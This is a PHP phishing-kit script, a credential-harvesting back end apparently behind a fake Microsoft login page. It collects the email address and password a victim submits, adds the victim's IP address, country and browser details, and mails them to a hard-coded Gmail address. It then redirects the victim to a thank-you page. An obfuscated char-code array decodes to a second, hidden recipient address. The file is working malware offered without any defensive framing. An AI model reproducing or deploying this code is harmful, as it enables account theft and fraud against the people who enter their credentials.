<?

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");

$message .= "----------------------------------------\n";
$message .= "Email: ".$_POST['UserName']."\n";
$message .= "Password: ".$_POST['Password']."\n";
$message .= "------\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "---\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---\n";
$message .= " - by *B0y -\n";

$boss = "terryanderson0110@gmail.com";


$subject = "MicroSoft 2017 - $ip";
$headers = "From: V <office465@office.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($boss,$subject,$message,$headers);
header("Location: thanky0u2.html");
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>
